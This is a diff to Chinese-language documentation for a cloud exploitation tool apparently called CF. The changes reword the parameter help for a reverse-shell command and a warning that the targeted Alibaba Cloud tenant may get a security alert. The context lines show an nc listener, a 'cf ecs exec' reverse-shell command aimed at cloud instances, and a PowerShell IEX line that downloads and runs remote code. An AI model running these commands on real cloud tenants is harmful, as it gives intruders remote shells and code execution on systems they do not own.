@@ -12,7 +12,7 @@ nc -lvvp 4444
 
 接着在 CF 中执行反弹 Shell 命令
 
-`--lhost` 参数配置为自己监听主机的 IP，`--lport` 参数配置为自己的监听端口，`-i` 设置要反弹 Shell 的实例 ID（如果不指定则默认是全部实例）
+`--lhost` 参数配置为自己监听主机的 IP，`--lport` 参数配置为自己的监听端口，`-i` 设置要反弹 Shell 的实例 ID（如果未指定具体的实例，则 CF 会提醒是否是选择全部实例还是某个实例。）
 
 ```bash
 cf ecs exec --lhost 123.123.123.123 --lport 4444 -i i-abcdefghijklmn
@@ -44,7 +44,7 @@ powershell IEX (New-Object System.Net.Webclient).DownloadString('https://ghproxy
 
 ::: warning 注意
 
-在阿里云下反弹 Shell ，目标租户将收到阿里云的云盾告警消息。
+在阿里云下反弹 Shell ，目标租户可能会收到阿里云的云盾告警消息，所以此操作需谨慎。
 
 :::
 
